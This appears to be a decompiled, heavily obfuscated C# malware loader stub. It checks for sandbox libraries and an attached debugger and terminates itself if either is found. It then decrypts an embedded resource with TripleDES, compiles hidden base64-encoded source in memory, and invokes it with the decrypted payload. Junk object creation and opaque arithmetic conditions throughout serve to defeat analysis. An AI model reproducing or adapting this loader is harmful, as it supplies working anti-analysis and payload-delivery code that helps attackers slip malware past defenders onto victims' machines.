using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Ports;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp;

public class bMGfyBsnqPpY
{
	private delegate IntPtr fF(string CF);

	private delegate bool KF(IntPtr GF, ref bool hF);

	private delegate bool sF(IntPtr mF, UIntPtr MF, uint nF, out uint NF);

	private static IntPtr SF;

	[DllImport("kernel32")]
	private static extern IntPtr GetProcAddress(IntPtr tF, string TF);

	[DllImport("kernel32")]
	private static extern IntPtr LoadLibrary(string UF);

	private unsafe static void VF()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_0112: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_038b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0391: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0589: Unknown result type (might be due to invalid IL or missing references)
		//IL_0595: Unknown result type (might be due to invalid IL or missing references)
		//IL_059b: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_05fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0601: Unknown result type (might be due to invalid IL or missing references)
		//IL_0613: Unknown result type (might be due to invalid IL or missing references)
		//IL_0619: Unknown result type (might be due to invalid IL or missing references)
		//IL_0758: Unknown result type (might be due to invalid IL or missing references)
		//IL_07cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_07eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_082d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0839: Unknown result type (might be due to invalid IL or missing references)
		//IL_087e: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_08d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08df: Unknown result type (might be due to invalid IL or missing references)
		//IL_08fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0907: Unknown result type (might be due to invalid IL or missing references)
		//IL_090d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0913: Unknown result type (might be due to invalid IL or missing references)
		//IL_0919: Unknown result type (might be due to invalid IL or missing references)
		//IL_093d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0943: Unknown result type (might be due to invalid IL or missing references)
		//IL_095e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0964: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a06: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a12: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a18: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a24: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a5a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b53: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b65: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bdf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0be5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0beb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c12: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c18: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c49: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c4f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c5b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c67: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c92: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d8a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d96: Unknown result type (might be due to invalid IL or missing references)
		//IL_0da3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0daf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0db5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ddf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0df1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e03: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e09: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e0f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e28: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f72: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fa3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fdc: Unknown result type (might be due to invalid IL or missing references)
		//IL_115e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1164: Unknown result type (might be due to invalid IL or missing references)
		//IL_116a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1170: Unknown result type (might be due to invalid IL or missing references)
		//IL_117c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1194: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_11a9: Expected O, but got Unknown
		//IL_130f: Unknown result type (might be due to invalid IL or missing references)
		//IL_134c: Unknown result type (might be due to invalid IL or missing references)
		//IL_13bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_13c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_140c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1431: Unknown result type (might be due to invalid IL or missing references)
		//IL_143d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1443: Unknown result type (might be due to invalid IL or missing references)
		//IL_1449: Unknown result type (might be due to invalid IL or missing references)
		//IL_1480: Unknown result type (might be due to invalid IL or missing references)
		//IL_159b: Unknown result type (might be due to invalid IL or missing references)
		//IL_15ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_15ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_15d0: Unknown result type (might be due to invalid IL or missing references)
		new ManagementClass();
		new ProcessStartInfo();
		new Process();
		new List<char>();
		new Random();
		new Process();
		new Process();
		new ManagementEventWatcher();
		new FileSystemWatcher();
		new ManagementObject();
		new SerialPort();
		new PerformanceCounter();
		SF = LoadLibrary(_003CModule_003E.Tf((string)_003CModule_003E.Xf()));
		byte[] value = new byte[Convert.ToInt32(1102112.0 - Math.Ceiling(367370.5))];
		try
		{
			int num = Convert.ToInt32(-9161.0);
			if ((Convert.ToInt32(967942.0) ^ 0x2C6C3) == Convert.ToInt32(787397.381887232 - Math.Sin(393698.5)))
			{
				Convert.ToInt32(1.0 + Math.Floor(1.0));
				num = num + sizeof(double) + Convert.ToInt32(9154.0 - Math.Tanh(4576.5));
			}
			BitConverter.ToInt32(value, num);
		}
		catch
		{
		}
		string value2 = _003CModule_003E.Tf((string)_003CModule_003E.yf());
		new SerialPort();
		new ProcessStartInfo();
		new Random();
		new Process();
		Console.WriteLine(value2);
		new ProcessStartInfo();
		new Random();
		new PerformanceCounter();
		_ = (sF)Marshal.GetDelegateForFunctionPointer(GetProcAddress(SF, _003CModule_003E.Tf((string)_003CModule_003E.Yf())), typeof(sF));
		uint num2 = (uint)Convert.ToInt32(278820.85569672723 + Math.Log10(139413.0));
		new Ping();
		new List<int>();
		new ManagementEventWatcher();
		new ProcessStartInfo();
		Convert.ToInt32(1783298882.2496808 - Math.Sqrt(891634511.0));
		int num3 = Convert.ToInt32(1783261317.0000002);
		if ((Convert.ToInt32(362520.0) ^ Convert.ToInt32(771952.4134363234 + Math.Log10(385979.0))) == Convert.ToInt32(468919.0 + Math.Abs(468919.0)))
		{
			Convert.ToInt32(1.4596976941318602 + Math.Cos(1.0));
			num3 = num3 + sizeof(double) + 7697;
		}
		int num4 = Convert.ToInt32(1783194158.0);
		if ((Convert.ToInt32(849793.6282805984 - Math.Log10(424894.0)) ^ Convert.ToInt32(561171.4217095864 + Math.Sin(280585.5))) == Convert.ToInt32(288623.0))
		{
			Convert.ToInt32(2.0);
			num4 = num4 + sizeof(double) + Convert.ToInt32(4583.0);
		}
		byte[] value3 = new byte[num3 ^ num4];
		new Process();
		try
		{
			int num5 = Convert.ToInt32(-4789.0);
			if ((Convert.ToInt32(786662.8968599256 + Math.Cos(393331.0)) ^ Convert.ToInt32(987833.0 - Math.Round(329277.5))) == Convert.ToInt32(396445.0))
			{
				Convert.ToInt32(2.0 + Math.Log10(1.0));
				num5 = num5 + sizeof(double) + Convert.ToInt32(2390.5 + Math.Abs(2390.5));
			}
			BitConverter.ToInt32(value3, num5);
		}
		catch
		{
		}
		new List<char>();
		new List<long>();
		num2 += (uint)Convert.ToInt32(676727.440452669 - Math.Sqrt(338073.0));
		new ManagementObjectSearcher();
		new PerformanceCounter();
		num2 += (uint)Convert.ToInt32(27733.0 + Math.Truncate(27733.0));
		new SerialPort();
		new ProcessStartInfo();
		string text = _003CModule_003E.Tf((string)_003CModule_003E.zf());
		int num6 = Convert.ToInt32(-5393.0);
		if ((Convert.ToInt32(1314583.0 - Math.Round(438194.5)) ^ Convert.ToInt32(313977.0)) == Convert.ToInt32(627997.0 - Math.Tanh(313998.0)))
		{
			Convert.ToInt32(2.0);
			num6 = num6 + sizeof(double) + Convert.ToInt32(5386.609235272847 + Math.Sin(2693.0));
		}
		string[] array = new string[num6];
		int num7 = -2283;
		if ((Convert.ToInt32(503830.11033103795 - Math.Tan(251915.0)) ^ Convert.ToInt32(277217.0)) == Convert.ToInt32(232194.66213395225 - Math.Log(116091.5)))
		{
			Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0));
			num7 = num7 + sizeof(double) + Convert.ToInt32(2274.7589385555502 + Math.Sin(1137.5));
		}
		array[num7] = _003CModule_003E.Tf((string)_003CModule_003E.Zf());
		int num8 = -4426;
		if ((Convert.ToInt32(22506.0 - Math.Round(7502.0)) ^ Convert.ToInt32(825532.3842929268 + Math.Log10(412769.0))) == Convert.ToInt32(827997.0 + Math.Tanh(413999.0)))
		{
			Convert.ToInt32(2.0);
			num8 = num8 + sizeof(double) + Convert.ToInt32(2209.0 + Math.Round(2209.0));
		}
		string[] array2 = text.Split(array, (StringSplitOptions)num8);
		new SerialPort();
		new Process();
		new ManagementClass();
		new ManagementClass();
		new SerialPort();
		new Random();
		new List<long>();
		new Stack<int>();
		new ManagementClass();
		fF fF = (fF)Marshal.GetDelegateForFunctionPointer(GetProcAddress(SF, _003CModule_003E.Tf((string)_003CModule_003E.smethod_0())), typeof(fF));
		new ManagementClass();
		new Process();
		new FileSystemWatcher();
		new ManagementObjectSearcher();
		new ManagementEventWatcher();
		new Ping();
		new Stack<float>();
		new SerialPort();
		new ManagementObjectSearcher();
		string[] array3 = array2;
		int num9 = Convert.ToInt32(-5677.0);
		if ((Convert.ToInt32(240920.0 - Math.Tanh(120459.5)) ^ Convert.ToInt32(245692.0 - Math.Floor(81897.5))) == 119492)
		{
			Convert.ToInt32(1.0 + Math.Abs(1.0));
			num9 = num9 + sizeof(double) + Convert.ToInt32(5669.996064352041 - Math.Tan(2834.5));
		}
		int num10 = num9;
		while (num10 < array3.Length)
		{
			string cF = array3[num10];
			if (fF(cF).ToInt32() != 0)
			{
				wF();
			}
			int num11 = num10;
			int num12 = Convert.ToInt32(-2553.0);
			if ((Convert.ToInt32(155223.99970502724 - Math.Sin(77611.5)) ^ 0xF3C8F) == Convert.ToInt32(877284.9914251909 - Math.Log(438636.0)))
			{
				Convert.ToInt32(2.0);
				num12 = num12 + sizeof(double) + Convert.ToInt32(2546.0);
			}
			num10 = num11 + num12;
		}
		new ProcessStartInfo();
		new PerformanceCounter();
		new Process();
		new FileSystemWatcher();
		int num13 = Convert.ToInt32(-5700.0);
		if ((Convert.ToInt32(566152.0) ^ Convert.ToInt32(332114.0)) == Convert.ToInt32(448877.0 + Math.Abs(448877.0)))
		{
			Convert.ToInt32(2.0);
			num13 = num13 + sizeof(double) + Convert.ToInt32(5692.0);
		}
		bool hF = (byte)num13 != 0;
		new Stack<long>();
		new SerialPort();
		new Process();
		new Stack<double>();
		new Ping();
		new ProcessStartInfo();
		new PerformanceCounter();
		new ManagementObjectSearcher();
		KF kF = (KF)Marshal.GetDelegateForFunctionPointer(GetProcAddress(SF, _003CModule_003E.Tf((string)_003CModule_003E.smethod_1())), typeof(KF));
		new ProcessStartInfo();
		new FileSystemWatcher();
		new PerformanceCounter();
		new Random();
		new ManagementEventWatcher();
		kF(Process.GetCurrentProcess().Handle, ref hF);
		new Stack<ulong>();
		uint num14 = (uint)Convert.ToInt32(697866.8501945714 + Math.Cos(348933.0));
		new List<uint>();
		new EventLog();
		num14 += (uint)Convert.ToInt32(263018.0 + Math.Ceiling(263018.0));
		new Random();
		new ManagementClass();
		if (hF)
		{
			wF();
		}
		new ProcessStartInfo();
		new EventLog();
		new Process();
		new PerformanceCounter();
		new PerformanceCounter();
		new Ping();
		new ManagementEventWatcher();
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_003CModule_003E.Tf((string)_003CModule_003E.smethod_2()));
		new ManagementObjectSearcher();
		new Process();
		new ManagementEventWatcher();
		new PerformanceCounter();
		new ManagementClass();
		new PerformanceCounter();
		new Process();
		new List<long>();
		new Ping();
		new Process();
		new Ping();
		new ManagementEventWatcher();
		new PerformanceCounter();
		byte[] array4 = new byte[manifestResourceStream.Length];
		new ProcessStartInfo();
		new SerialPort();
		new ManagementClass();
		new Process();
		new Process();
		int num15 = Convert.ToInt32(-4751.0);
		if ((0x13951 ^ Convert.ToInt32(746475.0)) == Convert.ToInt32(678587.0 - Math.Tanh(339293.0)))
		{
			Convert.ToInt32(3.0 - Math.Floor(1.0));
			num15 = num15 + sizeof(double) + Convert.ToInt32(4742.079897199626 - Math.Cos(2371.5));
		}
		manifestResourceStream.Read(array4, num15, array4.Length);
		new List<ulong>();
		new EventLog();
		new ManagementObjectSearcher();
		new ManagementObject();
		new ManagementObject();
		new Random();
		new PerformanceCounter();
		new Stack<double>();
		byte[] value4 = new byte[Convert.ToInt32(205083.0 - Math.Ceiling(68361.0))];
		new Process();
		new PerformanceCounter();
		new Stack<long>();
		try
		{
			int num16 = Convert.ToInt32(-5829.0);
			if ((Convert.ToInt32(184562.0 - Math.Tanh(92280.5)) ^ Convert.ToInt32(578664.0 - Math.Round(192888.0))) == Convert.ToInt32(707329.0 - Math.Truncate(235776.5)))
			{
				Convert.ToInt32(2.0 - Math.Log(1.0));
				num16 = num16 + sizeof(double) + Convert.ToInt32(5813.023919833288 + Math.Log(2910.5));
			}
			BitConverter.ToInt32(value4, num16);
		}
		catch
		{
		}
		new ManagementObjectSearcher();
		new Process();
		manifestResourceStream.Close();
		byte[] key = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(_003CModule_003E.Tf((string)_003CModule_003E.smethod_3())));
		new ManagementObjectSearcher();
		new PerformanceCounter();
		new Process();
		new Stack<int>();
		new ManagementEventWatcher();
		new ManagementObjectSearcher();
		new ProcessStartInfo();
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = (CipherMode)Convert.ToInt32(1.0 + Math.Ceiling(1.0));
		tripleDESCryptoServiceProvider.Padding = (PaddingMode)Convert.ToInt32(2.761594155955765 - Math.Tanh(1.0));
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider2 = tripleDESCryptoServiceProvider;
		new EventLog();
		new ManagementObject();
		new SerialPort();
		new ManagementEventWatcher();
		new ManagementObjectSearcher();
		new ManagementClass();
		ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider2.CreateDecryptor();
		string text2 = _003CModule_003E.Tf((string)_003CModule_003E.smethod_4());
		new ManagementObject();
		new ManagementClass();
		new ManagementEventWatcher();
		text2 += Convert.ToInt32(120891.00940641639 - Math.Log(60440.0));
		new EventLog();
		new ManagementObjectSearcher();
		new Stack<string>();
		new ManagementObjectSearcher();
		new Ping();
		new ManagementObjectSearcher();
		new ManagementEventWatcher();
		new ProcessStartInfo();
		new Ping();
		Console.WriteLine(text2);
		new Stack<uint>();
		new Stack<float>();
		new EventLog();
		int num17 = Convert.ToInt32(-9281.0);
		if ((Convert.ToInt32(1389977.0 - Math.Round(463325.5)) ^ Convert.ToInt32(724684.1277627504 + Math.Sin(362342.0))) == Convert.ToInt32(339319.0))
		{
			Convert.ToInt32(1.1585290151921035 + Math.Sin(1.0));
			num17 = num17 + sizeof(double) + Convert.ToInt32(13909.0 - Math.Round(4636.5));
		}
		byte[] array5 = cryptoTransform.TransformFinalBlock(array4, num17, array4.Length);
		new FileSystemWatcher();
		new SerialPort();
		string text3 = _003CModule_003E.Tf((string)_003CModule_003E.smethod_5());
		new Stack<uint>();
		text3 += Convert.ToInt32(935998.5 - Math.Abs(311999.5));
		new Process();
		new ManagementObjectSearcher();
		new Random();
		new ManagementObjectSearcher();
		tripleDESCryptoServiceProvider2.Clear();
		new ManagementObject();
		new ProcessStartInfo();
		new PerformanceCounter();
		new ManagementClass();
		new SerialPort();
		new Process();
		new ProcessStartInfo();
		new Process();
		new Ping();
		new PerformanceCounter();
		new ManagementObject();
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		new ManagementObject();
		new Random();
		new List<float>();
		new SerialPort();
		new EventLog();
		new EventLog();
		List<string> list = new List<string>();
		new ProcessStartInfo();
		new List<double>();
		new ManagementObjectSearcher();
		Assembly[] array6 = assemblies;
		int num18 = Convert.ToInt32(-8332.0);
		if ((0x5324E ^ Convert.ToInt32(1396915.5 - Math.Abs(465638.5))) == 722819)
		{
			Convert.ToInt32(2.0);
			num18 = num18 + sizeof(double) + Convert.ToInt32(8323.300685116752 - Math.Tan(4162.0));
		}
		int num19 = num18;
		while (num19 < array6.Length)
		{
			Assembly assembly = array6[num19];
			if (!assembly.IsDynamic)
			{
				list.Add(assembly.Location);
			}
			int num20 = num19;
			int num21 = Convert.ToInt32(-6694.0);
			if ((Convert.ToInt32(986975.0581790309 + Math.Cos(493488.0)) ^ Convert.ToInt32(376357.0 + Math.Round(376357.0))) == Convert.ToInt32(437439.0 - Math.Truncate(145813.0)))
			{
				Convert.ToInt32(1.0 + Math.Ceiling(1.0));
				num21 = num21 + sizeof(double) + Convert.ToInt32(6687.663419634754 - Math.Cos(3343.5));
			}
			num19 = num20 + num21;
		}
		new EventLog();
		new Ping();
		new PerformanceCounter();
		string value5 = _003CModule_003E.Tf((string)_003CModule_003E.smethod_6());
		new ProcessStartInfo();
		ulong num22 = (ulong)Convert.ToInt32(448344.0);
		new SerialPort();
		num22 += (ulong)Convert.ToInt32(481022.0771951143 + Math.Tan(240512.0));
		Console.WriteLine(value5);
		string[] array7 = list.ToArray();
		new ManagementEventWatcher();
		new Ping();
		int num23 = Convert.ToInt32(358164.0 - Math.Truncate(119388.0));
		int num24 = num23;
		Convert.ToInt32(471261815.37223226 - Math.Log10(235630903.5));
		int num25 = Convert.ToInt32(471252339.55899614 - Math.Cos(235626170.0));
		if ((Convert.ToInt32(5715.543709899117 + Math.Log10(2859.5)) ^ 0xE83B1) == Convert.ToInt32(1433817.0 - Math.Round(477939.0)))
		{
			Convert.ToInt32(1.2384058440442351 + Math.Tanh(1.0));
			num25 = num25 + sizeof(double) + Convert.ToInt32(9462.674815229804 - Math.Log10(4729.5));
		}
		Convert.ToInt32(471194570.69504964 + Math.Tan(235597286.0));
		int num26 = Convert.ToInt32(471191091.99999994);
		if ((Convert.ToInt32(946584.0) ^ Convert.ToInt32(224988.0)) == Convert.ToInt32(859971.2008426307 - Math.Cos(429986.0)))
		{
			Convert.ToInt32(2.0);
			num26 = num26 + sizeof(double) + Convert.ToInt32(1736.0 + Math.Floor(1736.0));
		}
		num23 = num24 + (num25 ^ num26);
		new ManagementClass();
		new ManagementEventWatcher();
		new EventLog();
		new ManagementClass();
		new FileSystemWatcher();
		ICodeCompiler val = ((CodeDomProvider)new CSharpCodeProvider()).CreateCompiler();
		new FileSystemWatcher();
		new List<double>();
		new SerialPort();
		new List<string>();
		CompilerParameters val2 = new CompilerParameters(array7);
		int num27 = Convert.ToInt32(-6739.0);
		if ((Convert.ToInt32(262261.87014245446 - Math.Sqrt(130950.0)) ^ Convert.ToInt32(845984.1284488469 - Math.Sqrt(422667.0))) == Convert.ToInt32(1484199.0 - Math.Abs(494733.0)))
		{
			Convert.ToInt32(3.5574077246549023 - Math.Tan(1.0));
			num27 = num27 + sizeof(double) + Convert.ToInt32(6728.47288588836 + Math.Log10(3366.0));
		}
		val2.set_GenerateInMemory((byte)num27 != 0);
		int num28 = Convert.ToInt32(-1387.0);
		if ((Convert.ToInt32(35352.75255458714 + Math.Log10(17678.5)) ^ Convert.ToInt32(793729.9448836143 - Math.Cos(396864.5))) == Convert.ToInt32(1237482.0 - Math.Ceiling(412494.0)))
		{
			Convert.ToInt32(1.0 + Math.Ceiling(1.0));
			num28 = num28 + sizeof(double) + Convert.ToInt32(1352.7416679889982 + Math.Sqrt(689.5));
		}
		val2.set_GenerateExecutable((byte)num28 != 0);
		CompilerParameters val3 = val2;
		new List<uint>();
		new SerialPort();
		new Random();
		uint num29 = (uint)Convert.ToInt32(476528.83078457764 - Math.Sin(238264.5));
		new Ping();
		new FileSystemWatcher();
		new Ping();
		new ManagementObject();
		new ProcessStartInfo();
		new Process();
		new Random();
		num29 += (uint)Convert.ToInt32(544658.5147441408 - Math.Log(272323.0));
		CompilerResults val4 = val.CompileAssemblyFromSource(val3, Encoding.UTF8.GetString(Convert.FromBase64String(_003CModule_003E.Tf((string)_003CModule_003E.smethod_7()))));
		new ProcessStartInfo();
		string value6 = _003CModule_003E.Tf((string)_003CModule_003E.smethod_8());
		new PerformanceCounter();
		new PerformanceCounter();
		Console.WriteLine(value6);
		uint num30 = (uint)Convert.ToInt32(255395.0 + Math.Ceiling(255395.5));
		num30 += (uint)Convert.ToInt32(369161.0);
		Assembly compiledAssembly = val4.get_CompiledAssembly();
		new Random();
		new ManagementObject();
		new List<string>();
		Type type = compiledAssembly.GetType(_003CModule_003E.Tf((string)_003CModule_003E.smethod_9()));
		new Ping();
		new ManagementObjectSearcher();
		new Ping();
		new ManagementClass();
		new ManagementObjectSearcher();
		new ManagementObject();
		new Random();
		new List<uint>();
		new Random();
		MethodInfo method = type.GetMethod(_003CModule_003E.Tf((string)_003CModule_003E.aF()));
		new Stack<uint>();
		new ProcessStartInfo();
		new ManagementObject();
		new ProcessStartInfo();
		int num31 = Convert.ToInt32(-1175.0);
		if ((Convert.ToInt32(449414.9919543123 - Math.Sin(224707.0)) ^ Convert.ToInt32(181857.18588175028 + Math.Cos(90928.5))) == Convert.ToInt32(269799.0))
		{
			Convert.ToInt32(1.0 + Math.Ceiling(1.0));
			num31 = num31 + sizeof(double) + Convert.ToInt32(1168.0);
		}
		object[] array8 = new object[num31];
		int num32 = -4889;
		if ((Convert.ToInt32(748254.0) ^ Convert.ToInt32(164571.6175147726 - Math.Cos(82285.5))) == Convert.ToInt32(648651.2540039632 + Math.Sqrt(324610.5)))
		{
			Convert.ToInt32(3.0 - Math.Ceiling(1.0));
			num32 = num32 + sizeof(double) + 4881;
		}
		array8[num32] = array5;
		method.Invoke(null, array8);
		new ManagementObject();
		_003CModule_003E.Tf((string)_003CModule_003E.AF());
		new ManagementEventWatcher();
		new Random();
		string text4 = _003CModule_003E.Tf((string)_003CModule_003E.bF());
		new List<ulong>();
		new EventLog();
		new PerformanceCounter();
		text4 += Convert.ToInt32(735804.9908840662 - Math.Sin(367902.5));
	}

	private unsafe static void wF()
	{
		try
		{
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
			int num = Convert.ToInt32(-8.0);
			if ((Convert.ToInt32(930.279531969112 + Math.Tan(466.0)) ^ Convert.ToInt32(3343.0 + Math.Floor(3342.5))) == Convert.ToInt32(6584.0 + Math.Tanh(3292.5)))
			{
				Convert.ToInt32(1.1585290151921035 + Math.Sin(1.0));
				num += sizeof(double);
			}
			Environment.Exit(num);
		}
	}
}
